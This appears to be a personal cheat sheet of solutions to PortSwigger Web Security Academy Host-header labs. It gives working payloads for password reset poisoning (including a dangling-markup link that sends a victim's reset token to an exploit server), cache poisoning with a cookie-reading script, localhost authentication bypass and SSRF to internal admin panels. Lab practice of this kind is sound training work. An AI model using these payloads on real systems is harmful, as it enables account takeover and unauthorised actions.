## LAB payloads
#### Basic password reset poisoning
- use forgot password functionality 
- change name to carlos 
- change host header to exploit server 
- use token

#### Password reset poisoning via middleware
- add X-Forwarded-Host header with exploit server
- change name to carlos
- use it in correct recover link

#### Password reset poisoning via dangling markup
- find that host header doesn't filter ports
- main idea - add link which will sent new password to exploit server
- add to host header
```
:'></a><a href="https://exploit-...exploit-server.net/?
```
- change name in forgot password to carlos
- use his password

#### Web cache poisoning via ambiguous requests
- use cache buster (/?bubu=4)
- find that second host header is being ignored but the same time it is being reflected in tracking.js link 
- after request is cached remove second host header and find that it is still reflected 
- so here is the way: create payload on exploit server with the path
```
/resources/js/tracking.js
alert(document.cookie)
```
- add second host header with exploit server
- poison cache without cache buster

#### Host header authentication bypass
- find that admin panel is accessible only from local machine
- change host header to localhost
- using repeater go to admin
- then request link to delete carlos

#### Host validation bypass via connection state attack
- find feature first released in burp v 2022.8.1
- create group of 2 requests
  - first to / 
  - second to /admin with **Host: 192.168.0.1**
  - change Connection header to keep-alive
  - after you get admin page, take:
    - link, username and csrf token
- change second req in group to post:
```
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE
Content-Type: x-www-form-urlencoded
Content-Length: CORRECT

csrf=YOUR-CSRF-TOKEN&username=carlos
```

#### Routing-based SSRF
- use intruder and deselect Update Host header to match target:
```
Host: 192.168.0.§2§
```
- numbers 0 to 255
- find response with 200
```
GET /admin HTTP/2
Host: 192.168.0.101
```
- go to browser try form for deletion
- then in repeater:
```
POST /admin/delete HTTP/2
Host: 192.168.0.101
...

csrf=xfzUXPR8ZXwVhFrbPwcl00EBwAwp0c2V&username=carlos
```
- also you can scan website and scanner will point to hTTP host header vulb

#### SSRF via flawed request parsing
- use intruder and deselect Update Host header to match target:
```
Host: 192.168.0.§2§
```
- find that if you add @ to the path you will find 504 and one 404, otherwise all responses will be 403
- that will help to find correct IP
- then based on this [article](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)  and theory from PortSwigger create a payload:
```
GET http://192.168.0.35@/admin HTTP/2
Host: 192.168.0.35
```
- you will get admin panel
```
POST http://192.168.0.35@/admin/delete HTTP/2
Host: 192.168.0.35
...

username=carlos&csrf=kKfDPH4NQBZWywvnLrNEtC5ry9upQnkj
```
or

- Observe that the website validates the Host header and blocks any requests in which it has been modified.
- Observe that you can also access the home page by supplying an absolute URL in the request line as follows:
```
GET https://YOUR-LAB-ID.web-security-academy.net/
```
- Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you 
receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header. 
- Then find that the following request will trigger an HTTP request to your Collaborator server:
```
GET https://YOUR-LAB-ID.web-security-academy.net/
Host: BURP-COLLABORATOR-SUBDOMAIN
```
- scan the IP range 192.168.0.0/24 to identify the IP address of the admin interface for 
```
GET https://YOUR-LAB-ID.web-security-academy.net/
Host: BURP-COLLABORATOR-SUBDOMAIN
```
- for identified IP:
```
GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete
Host: IP
```
- then:
```
GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
```
- copy the session cookie from the **Set-Cookie** and change to POST